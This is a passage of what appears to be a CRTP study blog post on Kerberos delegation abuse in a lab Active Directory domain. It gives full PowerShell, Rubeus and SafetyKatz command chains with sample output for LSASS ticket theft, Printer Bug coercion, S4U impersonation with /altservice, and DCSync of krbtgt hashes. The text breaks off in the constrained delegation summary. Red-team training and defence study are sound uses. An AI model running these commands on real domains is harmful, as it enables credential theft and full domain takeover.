---
title: "CRTP Deep Dive: Kerberos Delegation Attacks — Unconstrained, Constrained & Resource-Based (RBCD)"
date: 2026-04-10 02:00:00 +0200
categories: [Red Team, CRTP]
tags: [kerberos, delegation, unconstrained, constrained, rbcd, s4u, rubeus, active-directory, windows, crtp]
description: "A comprehensive guide covering all three Kerberos delegation types — Unconstrained Delegation with Printer Bug, Constrained Delegation with S4U abuse and altservice trick, and Resource-Based Constrained Delegation (RBCD) — with step-by-step PowerShell exploitation."
image:
  path: /assets/img/posts/delegation.png
  alt: "Kerberos Delegation Attacks"
pin: true
math: true
mermaid: true
---

## Introduction

Kerberos delegation is a feature in Active Directory that allows a service to **impersonate a user** and access other services on that user's behalf. While designed for legitimate multi-tier application scenarios (e.g., a web server accessing a database on behalf of a user), delegation is one of the most abused features in AD environments.

This post covers all three delegation types from the **CRTP perspective**:

1. **Unconstrained Delegation** — capture any user's TGT, including Domain Controllers
2. **Constrained Delegation** — abuse S4U extensions to impersonate any user to specific services (and beyond with altservice)
3. **Resource-Based Constrained Delegation (RBCD)** — abuse write permissions to configure delegation on a target

> All commands in this post are **PowerShell-based** and designed for **Windows environments**, as used in CRTP labs.
{: .prompt-info }

---

## Understanding the Three Delegation Types

```
┌──────────────────────────────────────────────────────────────────┐
│          THE THREE TYPES OF KERBEROS DELEGATION                  │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌────────────────────────────────────────────────────────────┐  │
│  │ 1. UNCONSTRAINED DELEGATION                                │  │
│  │    "I can impersonate ANY user to ANY service"             │  │
│  │                                                            │  │
│  │    • Service stores user's full TGT in memory              │  │
│  │    • Can use that TGT to access ANY service as that user   │  │
│  │    • UAC flag: TRUSTED_FOR_DELEGATION                      │  │
│  │    • Configured on: Computer/User objects                  │  │
│  │    • Risk Level: ★★★★★ CRITICAL                           │  │
│  └────────────────────────────────────────────────────────────┘  │
│                                                                  │
│  ┌────────────────────────────────────────────────────────────┐  │
│  │ 2. CONSTRAINED DELEGATION                                  │  │
│  │    "I can impersonate users only to SPECIFIC services"     │  │
│  │                                                            │  │
│  │    • Uses S4U2self + S4U2proxy extensions                  │  │
│  │    • Limited to SPNs in msDS-AllowedToDelegateTo           │  │
│  │    • UAC flag: TRUSTED_TO_AUTH_FOR_DELEGATION               │  │
│  │    • BUT: SPN in TGS is clear-text → altservice trick!     │  │
│  │    • Risk Level: ★★★★☆ HIGH                               │  │
│  └────────────────────────────────────────────────────────────┘  │
│                                                                  │
│  ┌────────────────────────────────────────────────────────────┐  │
│  │ 3. RESOURCE-BASED CONSTRAINED DELEGATION (RBCD)            │  │
│  │    "The TARGET decides who can delegate to it"             │  │
│  │                                                            │  │
│  │    • Controlled by msDS-AllowedToActOnBehalfOfOtherIdentity│  │
│  │    • Set on the TARGET (resource), not the front-end       │  │
│  │    • Only needs Write permissions + control of an SPN acct │  │
│  │    • No SeEnableDelegation needed (unlike the other two!)  │  │
│  │    • Risk Level: ★★★★☆ HIGH                               │  │
│  └────────────────────────────────────────────────────────────┘  │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### Visual Comparison

```
┌──────────────────────────────────────────────────────────────────┐
│          DELEGATION COMPARISON TABLE                              │
├──────────────┬──────────────┬──────────────┬─────────────────────┤
│              │ Unconstrained│ Constrained  │ RBCD                │
├──────────────┼──────────────┼──────────────┼─────────────────────┤
│ What's       │ User's FULL  │ Service gets │ Resource controls   │
│ delegated    │ TGT cached   │ TGS for      │ who can delegate    │
│              │ on server    │ specific SPNs│ to it               │
│              │              │              │                     │
│ Scope        │ ANY service  │ Specific SPNs│ Configured per-     │
│              │ anywhere     │ in msDS-     │ resource            │
│              │              │ AllowedTo... │                     │
│              │              │              │                     │
│ Configured   │ Front-end    │ Front-end    │ Back-end            │
│ on           │ service      │ service      │ (target resource)   │
│              │              │              │                     │
│ AD Attribute │ UserAccount  │ msDS-Allowed │ msDS-AllowedToAct   │
│              │ Control flag │ ToDelegateTo │ OnBehalfOfOther...  │
│              │              │              │                     │
│ Who can      │ Domain Admins│ Domain Admins│ Resource admin      │
│ configure    │ (SeEnable    │ (SeEnable    │ (Write permission   │
│              │ Delegation)  │ Delegation)  │ on target object)   │
│              │              │              │                     │
│ Attack needs │ Admin on     │ Creds/hash   │ Write perm on       │
│              │ delegating   │ of delegating│ target + control    │
│              │ machine      │ account      │ of SPN account      │
│              │              │              │                     │
│ Key tool     │ Rubeus       │ Rubeus s4u   │ Rubeus s4u +        │
│              │ monitor      │              │ Powermad/AD module  │
│              │              │              │                     │
│ CRTP focus   │ ★★★★★       │ ★★★★★       │ ★★★★☆              │
└──────────────┴──────────────┴──────────────┴─────────────────────┘
```

---

## Unconstrained Delegation

### How It Works

When a user authenticates to a service configured for Unconstrained Delegation, the KDC includes the user's **full TGT** inside the service ticket. The service then caches this TGT in LSASS. If an attacker has admin access on that machine, they can extract that TGT and impersonate the user to **any** service in the domain.

```
┌──────────────────────────────────────────────────────────────────┐
│           UNCONSTRAINED DELEGATION — HOW IT WORKS                │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  NORMAL FLOW:                                                    │
│                                                                  │
│  ┌──────┐  1.Auth   ┌─────┐  2.TGS+TGT  ┌───────────────────┐  │
│  │ User │ ────────► │ KDC │ ──────────► │ Service (Web)     │  │
│  │      │           │     │              │ UNCONSTRAINED      │  │
│  │      │           └─────┘              │ DELEGATION         │  │
│  │      │                                │                    │  │
│  │      │                                │ Caches User's TGT! │  │
│  │      │                                │ ┌──────────────┐   │  │
│  │      │                                │ │ User's TGT   │   │  │
│  │      │                                │ │ (in LSASS)   │   │  │
│  │      │                                │ └──────┬───────┘   │  │
│  │      │                                │        │           │  │
│  │      │                                │   3.Uses TGT to    │  │
│  │      │                                │   access DB on     │  │
│  │      │                                │   behalf of user   │  │
│  └──────┘                                │        │           │  │
│                                          │        ▼           │  │
│                                          │ ┌────────────────┐ │  │
│                                          │ │ Backend (SQL)  │ │  │
│                                          │ └────────────────┘ │  │
│                                          └───────────────────┘  │
│                                                                  │
│  ATTACKER ABUSE:                                                 │
│                                                                  │
│  ┌──────────┐  Admin on web server   ┌───────────────────┐      │
│  │ Attacker │ ─────────────────────► │ Service (Web)     │      │
│  │          │                        │ UNCONSTRAINED      │      │
│  │          │  Extract TGTs          │                    │      │
│  │          │  from LSASS!           │ ┌──────────────┐   │      │
│  │          │ ◄───────────────────── │ │ DA's TGT     │   │      │
│  │          │                        │ │ DC$ TGT      │   │      │
│  │          │                        │ │ svcadmin TGT │   │      │
│  │          │                        │ └──────────────┘   │      │
│  │          │                        └───────────────────┘      │
│  │          │                                                    │
│  │          │  Use DA's TGT → Access ANYTHING!                   │
│  │          │  Use DC$ TGT  → DCSync!                            │
│  └──────────┘                                                    │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### Step 1: Enumerate Unconstrained Delegation

```powershell
# ============================================================
# ENUMERATE COMPUTERS WITH UNCONSTRAINED DELEGATION
# ============================================================

# Using PowerView — find all computers with Unconstrained Delegation
Import-Module .\PowerView.ps1
Get-DomainComputer -UnConstrained

# More detailed output with specific properties
Get-DomainComputer -UnConstrained | Select-Object name, dnshostname, useraccountcontrol

# Using LDAP filter directly (alternative method)
Get-DomainComputer -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"

# Find USERS with Unconstrained Delegation (less common but possible)
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)" | Select-Object samaccountname, useraccountcontrol
```

#### Example Output

```
PS C:\AD\Tools> Get-DomainComputer -UnConstrained | Select-Object name, dnshostname, useraccountcontrol

name            dnshostname                                  useraccountcontrol
----            -----------                                  ------------------
DCORP-DC        dcorp-dc.dollarcorp.moneycorp.local          SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
DCORP-APPSRV    dcorp-appsrv.dollarcorp.moneycorp.local      WORKSTATION_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
```

> Domain Controllers always have Unconstrained Delegation enabled by design. The interesting targets are **non-DC** machines like DCORP-APPSRV.
{: .prompt-tip }

### Step 2: Extract Cached TGTs (Passive Method)

If users have already authenticated to the Unconstrained Delegation machine, their TGTs are cached in LSASS.

```powershell
# ============================================================
# EXTRACT CACHED TICKETS FROM LSASS
# Requires: Admin access on the Unconstrained Delegation machine
# ============================================================

# Export ALL tickets from LSASS to disk
SafetyKatz.exe "sekurlsa::tickets /export" "exit"

# This creates .kirbi files in the current directory:
# [0;3e4]-0-0-40a10000-dcorp-dc$@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi
# [0;12beef]-2-1-40e10000-Administrator@krbtgt-MONEYCORP.LOCAL.kirbi
# etc.

# Inject a specific ticket (e.g., a Domain Admin's TGT)
SafetyKatz.exe "kerberos::ptt [0;12beef]-2-1-40e10000-Administrator@krbtgt-MONEYCORP.LOCAL.kirbi" "exit"

# Verify the ticket was injected
klist

# Now you can access resources as that user!
dir \\dcorp-dc\C$
```

#### Example Output

```
PS C:\AD\Tools> SafetyKatz.exe "sekurlsa::tickets /export" "exit"

Authentication Id : 0 ; 997 (00000000:000003E5)
Session           : Service from 0
User Name         : dcorp-appsrv$
Domain            : DCORP
Logon Server      : (null)

  Group 0 - Ticket Granting Service
   [0] Start/End/MaxRenew: 4/10/2026 ; 4/10/2026 ; 4/17/2026
       Service Name: krbtgt/DOLLARCORP.MONEYCORP.LOCAL
       Target Name:  krbtgt/DOLLARCORP.MONEYCORP.LOCAL
       Client Name:  dcorp-appsrv$ @ DOLLARCORP.MONEYCORP.LOCAL
       Flags: 40a10000  -> forwardable ; renewable ; pre_authent ; name_canonicalize
       * Saved to file    : [0;3e5]-0-0-40a10000-dcorp-appsrv$@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi

Authentication Id : 0 ; 253943 (00000000:0003DFF7)
Session           : Interactive from 2
User Name         : svcadmin
Domain            : DCORP

  Group 0 - Ticket Granting Ticket
   [0] Start/End/MaxRenew: 4/10/2026 ; 4/10/2026 ; 4/17/2026
       Service Name: krbtgt/DOLLARCORP.MONEYCORP.LOCAL
       Target Name:  krbtgt/DOLLARCORP.MONEYCORP.LOCAL
       Client Name:  svcadmin @ DOLLARCORP.MONEYCORP.LOCAL
       Flags: 40e10000  -> forwardable ; renewable ; initial ; pre_authent
       * Saved to file    : [0;3dff7]-0-0-40e10000-svcadmin@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi
```

### Step 3: Active Attack — Printer Bug + Rubeus Monitor

Instead of waiting for users to authenticate passively, you can **force** a Domain Controller to authenticate to the Unconstrained Delegation machine using the **Printer Bug** (MS-RPRN).

```
┌──────────────────────────────────────────────────────────────────┐
│         PRINTER BUG + UNCONSTRAINED DELEGATION ATTACK            │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Step 1: Start Rubeus monitor on the UD machine                  │
│  ┌─────────────────────────────────────────────┐                 │
│  │ Rubeus.exe monitor /interval:5 /nowrap      │                 │
│  │ → Watches for new TGTs arriving in LSASS    │                 │
│  └──────────────────────┬──────────────────────┘                 │
│                         │ Listening...                            │
│                         │                                        │
│  Step 2: Trigger Printer Bug (from any domain user)              │
│  ┌─────────────────────────────────────────────┐                 │
│  │ MS-RPRN.exe \\dcorp-dc \\dcorp-appsrv       │                │
│  │ → Forces DC to auth to our UD machine       │                 │
│  └──────────────────────┬──────────────────────┘                 │
│                         │                                        │
│                         ▼                                        │
│  ┌──────────┐  "Print notification"  ┌────────────────────┐     │
│  │ Attacker │ ──────────────────────►│ Domain Controller  │     │
│  │          │                        │ dcorp-dc            │     │
│  │          │                        └────────┬───────────┘     │
│  │          │                                 │                  │
│  │          │                    DC authenticates                 │
│  │          │                    to dcorp-appsrv                  │
│  │          │                    (sends its TGT!)                 │
│  │          │                                 │                  │
│  │          │                                 ▼                  │
│  │          │                        ┌────────────────────┐     │
│  │          │                        │ dcorp-appsrv       │     │
│  │          │                        │ (Unconstrained)     │     │
│  │          │  ◄──── Rubeus ──────── │                    │     │
│  │          │  captures DC$'s TGT!   │ DC$'s TGT cached   │     │
│  └──────────┘                        └────────────────────┘     │
│                         │                                        │
│                         ▼                                        │
│  Step 3: Inject DC$ TGT and run DCSync                           │
│  ┌─────────────────────────────────────────────┐                 │
│  │ Rubeus.exe ptt /ticket:<base64_TGT>         │                 │
│  │ SafetyKatz.exe "lsadump::dcsync             │                 │
│  │   /user:dcorp\krbtgt" "exit"                │                 │
│  │ → DOMAIN COMPROMISE!                        │                 │
│  └─────────────────────────────────────────────┘                 │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

#### Step 3a: Start Rubeus Monitor

```powershell
# ============================================================
# ON THE UNCONSTRAINED DELEGATION MACHINE (dcorp-appsrv)
# Run Rubeus in monitor mode — watches for new TGTs every 5 seconds
# ============================================================

.\Rubeus.exe monitor /interval:5 /nowrap
```

#### Rubeus Monitor Output (waiting...)

```
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: TGT Monitoring
[*] Monitoring every 5 seconds for new TGTs
[*] Target LUID: 0
[*] Press ESC to stop monitoring
```

#### Step 3b: Trigger the Printer Bug

```powershell
# ============================================================
# FROM ANY MACHINE (as any domain user)
# Trigger the Printer Bug to force DC to authenticate to our UD machine
# ============================================================

# Using MS-RPRN (SpoolSample)
MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```

#### Rubeus Monitor Captures the DC TGT

```
[*] 4/10/2026 2:15:32 AM UTC - Found new TGT:

  User                  :  DCORP-DC$@DOLLARCORP.MONEYCORP.LOCAL
  StartTime             :  4/10/2026 2:15:30 AM
  EndTime               :  4/10/2026 12:15:30 PM
  RenewTill             :  4/17/2026 2:15:30 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFmTCCBZWgAwIBBaEDAgEWooIEmzCCBJdhggSTMIIEj6ADAgEFoRwbGkRP
    TExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMoS8wLaADAgECoSYwJBsGa3JidGd0
    GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKOCA1EwggNNoAMCARKhAwIB
    ... <SNIP - long base64 string> ...
    LkxPQ0FM

[*] Ticket cache size: 1
```

#### Step 3c: Inject TGT and DCSync

```powershell
# ============================================================
# INJECT THE CAPTURED DC$ TGT
# ============================================================

# Pass the ticket — inject the DC's TGT into our session
Rubeus.exe ptt /ticket:doIFmTCCBZWgAwIBBaEDAgEWooIEmzCCBJdh<SNIP>LkxPQ0FM

# Optionally: Renew the ticket to extend its lifetime
.\Rubeus.exe renew /ticket:doIFmTCCBZWgAwIBBaEDAgEWooIEmzCCBJdh<SNIP>LkxPQ0FM /ptt

# Or request a TGS for a specific service on the DC
.\Rubeus.exe asktgs /ticket:doIFmTCCBZWgAwIBBaEDAgEWooIEmzCCBJdh<SNIP>LkxPQ0FM /service:cifs/dcorp-dc.dollarcorp.moneycorp.local /ptt

# Verify injection
klist

# Now run DCSync using the DC's identity!
SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

#### Example Output

```
PS C:\AD\Tools> Rubeus.exe ptt /ticket:doIFmTCCBZW<SNIP>

[*] Action: Import Ticket
[+] Ticket successfully imported!
[*] base64(ticket.kirbi):
    ServiceName              :  krbtgt/DOLLARCORP.MONEYCORP.LOCAL
    UserName                 :  DCORP-DC$
    UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL

PS C:\AD\Tools> klist

Cached Tickets: (1)

#0>     Client: DCORP-DC$ @ DOLLARCORP.MONEYCORP.LOCAL
        Server: krbtgt/DOLLARCORP.MONEYCORP.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent

PS C:\AD\Tools> SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"

[DC] 'dollarcorp.moneycorp.local' will be the domain
[DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
[DC] 'dcorp\krbtgt' will be the user account

** SAM ACCOUNT **
SAM Username         : krbtgt

Credentials:
  Hash NTLM: ff46a9d8bd66c6efd77603da26796f35
  aes256_hmac: 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848

[+] DOMAIN COMPROMISE ACHIEVED!
```

---

## Constrained Delegation

### How It Works — S4U Extensions

Constrained Delegation uses two Kerberos extensions collectively known as **S4U** (Service for User):

```
┌──────────────────────────────────────────────────────────────────┐
│           S4U EXTENSIONS — THE TWO-STEP PROCESS                  │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌──────────────────────────────────────────────────────────┐    │
│  │ S4U2self (Service for User to Self)                      │    │
│  │                                                          │    │
│  │ Purpose: Get a TGS to YOURSELF on behalf of any user     │    │
│  │                                                          │    │
│  │ ┌─────────┐  "Give me a TGS    ┌─────┐                  │    │
│  │ │ websvc  │  for myself, as if  │ KDC │                  │    │
│  │ │ (front  │  Administrator was  │     │                  │    │
│  │ │  end)   │  authenticating     │     │                  │    │
│  │ │         │  to me"             │     │                  │    │
│  │ │         │ ──────────────────►│     │                  │    │
│  │ │         │                     │     │                  │    │
│  │ │         │ ◄──────────────────│     │                  │    │
│  │ │         │  Here's a TGS for  │     │                  │    │
│  │ │         │  websvc, as if     │     │                  │    │
│  │ │         │  Administrator was  │     │                  │    │
│  │ │         │  the client         │     │                  │    │
│  │ └─────────┘                     └─────┘                  │    │
│  │                                                          │    │
│  │ ★ Only needs the User Principal Name — NO password!     │    │
│  │ ★ Returns a forwardable TGS                             │    │
│  └──────────────────────────────────────────────────────────┘    │
│                                                                  │
│  ┌──────────────────────────────────────────────────────────┐    │
│  │ S4U2proxy (Service for User to Proxy)                    │    │
│  │                                                          │    │
│  │ Purpose: Use the S4U2self TGS to get a TGS for the      │    │
│  │          TARGET service (e.g., CIFS on SQL server)        │    │
│  │                                                          │    │
│  │ ┌─────────┐  "Here's the        ┌─────┐                 │    │
│  │ │ websvc  │  S4U2self ticket.   │ KDC │                 │    │
│  │ │         │  Give me a TGS for  │     │                 │    │
│  │ │         │  CIFS/dcorp-mssql   │     │                 │    │
│  │ │         │  as Administrator"  │     │                 │    │
│  │ │         │ ──────────────────►│     │                 │    │
│  │ │         │                     │     │                 │    │
│  │ │         │ ◄──────────────────│     │                 │    │
│  │ │         │  TGS for CIFS/     │     │                 │    │
│  │ │         │  dcorp-mssql as    │     │                 │    │
│  │ │         │  Administrator      │     │                 │    │
│  │ └─────────┘                     └─────┘                  │    │
│  │                                                          │    │
│  │ ★ KDC checks msDS-AllowedToDelegateTo for the SPN      │    │
│  │ ★ Only allows delegation to listed SPNs                 │    │
│  └──────────────────────────────────────────────────────────┘    │
│                                                                  │
│  RESULT: websvc now has a ticket to CIFS/dcorp-mssql             │
│  as Administrator — can access the SQL server's file system!     │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### Step 1: Enumerate Constrained Delegation

```powershell
# ============================================================
# ENUMERATE CONSTRAINED DELEGATION — Users and Computers
# ============================================================

Import-Module .\PowerView.ps1

# Find USERS with Constrained Delegation
Get-DomainUser -TrustedToAuth

# Find COMPUTERS with Constrained Delegation
Get-DomainComputer -TrustedToAuth

# Detailed view with delegation targets
Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto

Get-DomainComputer -TrustedToAuth | Select-Object name, msds-allowedtodelegateto
```

#### Example Output

```
PS C:\AD\Tools> Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto

samaccountname    msds-allowedtodelegateto
--------------    ------------------------
websvc            {CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL}

PS C:\AD\Tools> Get-DomainComputer -TrustedToAuth | Select-Object name, msds-allowedtodelegateto

name              msds-allowedtodelegateto
----              ------------------------
DCORP-ADMINSRV    {time/dcorp-dc.dollarcorp.moneycorp.LOCAL}
```

### Understanding the Output

```
┌──────────────────────────────────────────────────────────────────┐
│         CONSTRAINED DELEGATION ENUMERATION RESULTS               │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  FINDING 1: User Account                                         │
│  ┌────────────────────────────────────────────────────────────┐  │
│  │ Account: websvc                                            │  │
│  │ Type:    User account                                      │  │
│  │ Can delegate to: CIFS/dcorp-mssql                          │  │
│  │                                                            │  │
│  │ ★ If we get websvc's hash/keys → impersonate anyone       │  │
│  │   to CIFS on dcorp-mssql (file system access!)             │  │
│  └────────────────────────────────────────────────────────────┘  │
│                                                                  │
│  FINDING 2: Computer Account                                     │
│  ┌────────────────────────────────────────────────────────────┐  │
│  │ Account: DCORP-ADMINSRV$                                   │  │
│  │ Type:    Computer account                                  │  │
│  │ Can delegate to: time/dcorp-dc                             │  │
│  │                                                            │  │
│  │ ★ "time" service seems harmless... BUT:                   │  │
│  │   The SPN in the TGS is CLEAR-TEXT!                        │  │
│  │   We can change it to LDAP, CIFS, HOST, etc.               │  │
│  │   → /altservice:ldap → DCSync on dcorp-dc!                │  │
│  └────────────────────────────────────────────────────────────┘  │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### Step 2: Abuse Constrained Delegation (User Account)

```powershell
# ============================================================
# CONSTRAINED DELEGATION ABUSE — User Account (websvc)
# Requires: websvc's hash, AES key, or password
# ============================================================

# Using Rubeus S4U chain — get a TGS as Administrator to CIFS/dcorp-mssql
Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /ptt

# Verify access
ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```

#### Example Output

```
PS C:\AD\Tools> Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: S4U

[*] Using aes256_cts_hmac_sha1 hash: 2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\websvc'
[+] TGT request successful!

[*] Action: S4U2self

[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Building S4U2self request for: 'websvc@DOLLARCORP.MONEYCORP.LOCAL'
[*] Impersonating user 'Administrator' to self
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'websvc@DOLLARCORP.MONEYCORP.LOCAL'

[*] Action: S4U2proxy

[*] Building S4U2proxy request for: 'Administrator@DOLLARCORP.MONEYCORP.LOCAL'
[*] Sending S4U2proxy request for service: 'CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL'
[+] S4U2proxy success!
[*] base64(ticket.kirbi):

      doIF5jCCBeKgAwIBBaEDAgEWoo...

[*] Action: Import Ticket
[+] Ticket successfully imported!

  ServiceName              :  CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL
  UserName                 :  Administrator@DOLLARCORP.MONEYCORP.LOCAL
  StartTime                :  4/10/2026 2:20:00 AM
  EndTime                  :  4/10/2026 12:20:00 PM
  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, forwardable

PS C:\AD\Tools> ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$

    Directory: \\dcorp-mssql.dollarcorp.moneycorp.local\c$

Mode                LastWriteTime     Length Name
----                -------------     ------ ----
d-----       11/11/2022  11:00 AM            PerfLogs
d-r---        4/10/2026  10:00 AM            Program Files
d-r---       11/11/2022  10:30 AM            Program Files (x86)
d-r---        4/10/2026   2:00 AM            Users
d-----        4/10/2026   1:00 AM            Windows

[+] SUCCESS! Accessing dcorp-mssql as Administrator!
```

### Step 3: The altservice Trick — Escalate to DCSync

This is the **most important** concept in Constrained Delegation abuse. The SPN value in the TGS is **clear-text** and is not validated by the target service. This means if delegation is configured for a harmless service like `time/dcorp-dc`, you can change it to `ldap/dcorp-dc` and perform DCSync.

```
┌──────────────────────────────────────────────────────────────────┐
│              THE /ALTSERVICE TRICK EXPLAINED                     │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  WHAT THE ADMIN CONFIGURED:                                      │
│  ┌─────────────────────────────────────────────────┐             │
│  │ DCORP-ADMINSRV$ can delegate to:                │             │
│  │ → time/dcorp-dc.dollarcorp.moneycorp.LOCAL      │             │
│  │                                                  │             │
│  │ Admin thought: "time service is harmless,        │             │
│  │                 just NTP sync, right?"            │             │
│  └─────────────────────────────────────────────────┘             │
│                                                                  │
│  WHAT THE ATTACKER CAN DO:                                       │
│  ┌─────────────────────────────────────────────────┐             │
│  │ The SPN in the Kerberos TGS is CLEAR-TEXT!       │             │
│  │                                                  │             │
│  │ Original TGS:  Service = time/dcorp-dc           │             │
│  │                                                  │             │
│  │ Modified TGS:  Service = ldap/dcorp-dc ← CHANGED│             │
│  │                                                  │             │
│  │ The target (dcorp-dc) does NOT validate           │             │
│  │ that the SPN matches the original delegation!     │             │
│  └─────────────────────────────────────────────────┘             │
│                                                                  │
│  SERVICES YOU CAN SWITCH TO:                                     │
│  ┌──────────────┬────────────────────────────────┐               │
│  │ altservice   │ What it enables                │               │
│  ├──────────────┼────────────────────────────────┤               │
│  │ ldap         │ DCSync! (extract all hashes)   │               │
│  │ cifs         │ File system access (C$ share)  │               │
│  │ host         │ PsExec, WMI, scheduled tasks   │               │
│  │ http         │ WinRM / PSRemoting              │               │
│  │ wsman        │ WinRM / PSRemoting              │               │
│  │ rpcss        │ WMI execution                  │               │
│  │ krbtgt       │ Golden Ticket potential         │               │
│  └──────────────┴────────────────────────────────┘               │
│                                                                  │
│  ★ Delegation to "time" → actually means delegation to          │
│    ANY service on that machine!                                  │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

#### Exploiting with /altservice

```powershell
# ============================================================
# CONSTRAINED DELEGATION ABUSE — Computer Account with /altservice
# DCORP-ADMINSRV$ can delegate to time/dcorp-dc
# We change the SPN to ldap/dcorp-dc for DCSync!
# ============================================================

# Request a TGS for time/dcorp-dc but ALTER the service to ldap
Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b445 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt

# The TGS now says ldap/dcorp-dc instead of time/dcorp-dc!
# Run DCSync using this ticket:
SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

#### Example Output

```
PS C:\AD\Tools> Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b445 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt

[*] Action: S4U

[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\dcorp-adminsrv$'
[+] TGT request successful!

[*] Action: S4U2self
[*] Impersonating user 'Administrator' to self
[+] S4U2self success!

[*] Action: S4U2proxy
[*] Sending S4U2proxy request for service: 'time/dcorp-dc.dollarcorp.moneycorp.LOCAL'
[+] S4U2proxy success!

[*] Substituting service name 'time' with 'ldap'

[+] Ticket successfully imported!

  ServiceName              :  ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL
  UserName                 :  Administrator@DOLLARCORP.MONEYCORP.LOCAL

PS C:\AD\Tools> SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"

[DC] 'dollarcorp.moneycorp.local' will be the domain
[DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server

** SAM ACCOUNT **
SAM Username         : krbtgt
Credentials:
  Hash NTLM: ff46a9d8bd66c6efd77603da26796f35
  aes256_hmac: 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848

[+] DCSync via altservice trick — DOMAIN COMPROMISED!
```

### Constrained Delegation Attack Summary

```
┌──────────────────────────────────────────────────────────────────┐
│       CONSTRAINED DELEGATION — ATTACK WORKFLOW                   │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  FOR USER ACCOUNTS (e.g., websvc):                               │
│  ┌─────────────────────────────────────────────┐                 │
│  │ 1. Enumerate: Get-DomainUser -TrustedToAuth │                 │
│  │ 2. Get creds: Hash/AES key of websvc        │                 │
│  │ 3. Rubeus S4U:                               │                 │
│  │    /user:websvc /aes256:<key>                │                 │
│  │    /impersonateuser:Administrator            │                 │
│  │    /msdsspn:CIFS/target /ptt                 │                 │
│  │ 4. Access: ls \\target\c$                    │                 │
│  └─────────────────────────────────────────────┘                 │
│                                                                  │
│  FOR COMPUTER ACCOUNTS (e.g., dcorp-adminsrv$):                  │
│  ┌─────────────────────────────────────────────┐                 │
│  │ 1. Enumerate: Get-DomainComputer            │                 │
│  │    -TrustedToAuth                            │                 │
│  │ 2. Get creds: AES key of machine account     │                 │
│  │ 3. Rubeus S4U with /altservice:              │                 │
│  │    /user:dcorp-adminsrv$                     │                 │
│  │    /aes256:<key>                             │                 │
│  │    /impersonateuser:Administrator            │                 │
